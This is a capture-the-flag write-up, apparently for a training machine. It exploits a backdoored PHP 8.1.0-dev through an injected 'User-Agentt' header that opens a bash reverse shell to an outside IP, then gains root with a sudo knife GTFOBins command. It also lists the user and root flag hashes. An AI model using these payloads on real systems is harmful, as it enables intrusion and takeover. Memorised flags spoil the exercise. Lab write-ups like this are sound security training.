#box #HTTP-Headers-RCE #PHP #knife #GTFOBins 
The box involves a vulnerability dictated by a vulnerable header version mentioned by PHP in our landing page. The php version is `8.1.0-dev` which is strange as a version to have in production. By googling it we retrieve the existence of a User-Agent injection that permits RCE. Once RCE inside the machine, by `sudo -l` we realize we have sudo capabilities on `/usr/bin/knife`. With GTFOBins we're able to privilege escalate due to a vulnerability of the executable.

## Nmap

```bash title:'Nmap Scan'
# Nmap 7.95 scan initiated Sat Mar 22 14:09:23 2025 as: /usr/lib/nmap/nmap --top-ports=1000 -sC -sV -o nmap_top1000sCsV 10.129.52.174
Nmap scan report for 10.129.52.174
Host is up (0.085s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 22 14:09:33 2025 -- 1 IP address (1 host up) scanned in 10.07 seconds
```

## HTTP

By reaching the landing page we notice a page which, from the source code, seems empty and does not reconduct to any potential vulnerability. Enumeration doesn't work, LFI doesn't work, no input for XSS.
We find out in the headers a suspicious header `X-Powered-By: PHP/8.1.0-dev`.
By googling it, we realize the existence of the following [exploit](https://www.exploit-db.com/exploits/49933).

We run `nc -lvnp 1337` and then intercept with ZAP the request and proceed with the injection of the `User-Agentt` header, getting a shell on the machine

```http
GET http://10.129.38.156/index.php HTTP/1.1
host: 10.129.38.156
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
User-Agentt: zerodiumsystem('bash -c "/bin/bash -i >& /dev/tcp/10.10.16.39/1337 0>&1"');
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
content-length: 0
```

User: `87d02c57253b50e2f73316922297da1d`
## Knife and Privilege Escalation

Once on the machine, one of the first thing to do is to enumerate our sudo capabilities with the current user.
We realize that we have sudo powers on `/usr/bin/knife`. 
We then check on GTFOBins whether there's any Living Off the Land binary for knife and we discover the [following](https://gtfobins.github.io/gtfobins/knife/).
We then execute `sudo knife exec -E 'exec "/bin/sh"'` to get root on the machine.

Root: `db19b4ddf8dd8567b1c9633a06ae6cd0`